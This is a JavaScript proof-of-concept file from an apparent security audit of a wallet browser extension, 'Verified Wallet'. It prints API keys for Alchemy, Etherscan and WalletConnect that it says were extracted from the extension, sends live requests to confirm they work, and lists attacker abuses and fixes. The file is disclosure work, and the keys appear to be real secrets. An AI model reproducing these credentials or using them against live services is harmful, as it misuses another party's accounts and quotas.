/**
 * PoC #3: Hardcoded API Keys Exposure
 * 
 * Vulnerability: The extension exposes multiple API keys in client-side code.
 * 
 * Run with: node poc/03-api-key-exposure.js
 */

// Extracted API keys from the extension source code
const EXTRACTED_KEYS = {
    alchemy: {
        key: "82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
        endpoints: {
            ethereum: "https://eth-mainnet.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
            base: "https://base-mainnet.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
            sepolia: "https://eth-sepolia.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ"
        }
    },
    etherscan: {
        key: "M8SGUPC8CXRTER5GGTSSXW7C9A1ZINWWYA",
        apiUrl: "https://api.etherscan.io/v2/api"
    },
    walletConnect: {
        projectId: "90b0e2ff886ba98147f2780659cf12a6"
    }
};

async function testAlchemyKey() {
    console.log("🔑 Testing Alchemy API Key...\n");

    try {
        const response = await fetch(EXTRACTED_KEYS.alchemy.endpoints.ethereum, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "eth_blockNumber",
                params: []
            })
        });

        const data = await response.json();

        if (data.result) {
            const blockNumber = parseInt(data.result, 16);
            console.log("✅ Alchemy key is VALID and ACTIVE!");
            console.log(`   Current Ethereum block: ${blockNumber}`);
            console.log(`   Key: ${EXTRACTED_KEYS.alchemy.key}`);
            console.log("\n   ⚠️  This key could be rate-limited by attackers");
        } else if (data.error) {
            console.log("❌ Key appears invalid or rate-limited:", data.error);
        }
    } catch (e) {
        console.log("Error testing Alchemy key:", e.message || e);
    }
}

async function testEtherscanKey() {
    console.log("\n🔑 Testing Etherscan API Key...\n");

    try {
        const url = `${EXTRACTED_KEYS.etherscan.apiUrl}?chainid=1&module=account&action=balance&address=0x0000000000000000000000000000000000000000&tag=latest&apikey=${EXTRACTED_KEYS.etherscan.key}`;

        const response = await fetch(url);
        const data = await response.json();

        if (data.status === "1" || data.message === "OK") {
            console.log("✅ Etherscan key is VALID and ACTIVE!");
            console.log(`   Key: ${EXTRACTED_KEYS.etherscan.key}`);
            console.log("\n   ⚠️  This key could be used to make 5 req/sec");
        } else {
            console.log("❌ Key issue:", data.message || data.result);
        }
    } catch (e) {
        console.log("Error testing Etherscan key:", e.message || e);
    }
}

function demonstrateWalletConnectRisk() {
    console.log("\n🔑 WalletConnect Project ID Exposure...\n");

    console.log(`Project ID: ${EXTRACTED_KEYS.walletConnect.projectId}`);
    console.log("\n⚠️  Risks:");
    console.log("   1. Attacker can create fake wallet connections using this ID");
    console.log("   2. Usage metrics will be inflated/manipulated");
    console.log("   3. Potential for phishing by impersonating 'Verified Wallet'");
}

async function main() {
    console.log("=".repeat(60));
    console.log("VERIFIED WALLET - API KEY EXPOSURE PoC");
    console.log("=".repeat(60) + "\n");

    console.log("📋 EXTRACTED API KEYS:");
    console.log(JSON.stringify(EXTRACTED_KEYS, null, 2));
    console.log("\n" + "-".repeat(60));

    await testAlchemyKey();
    await testEtherscanKey();
    demonstrateWalletConnectRisk();

    console.log("\n" + "=".repeat(60));
    console.log("RECOMMENDATIONS:");
    console.log("  1. Use server-side proxy for RPC calls");
    console.log("  2. Rotate exposed API keys immediately");
    console.log("  3. Implement rate limiting on client side");
    console.log("  4. Consider using environment-specific keys");
    console.log("=".repeat(60));
}

main().catch(console.error);
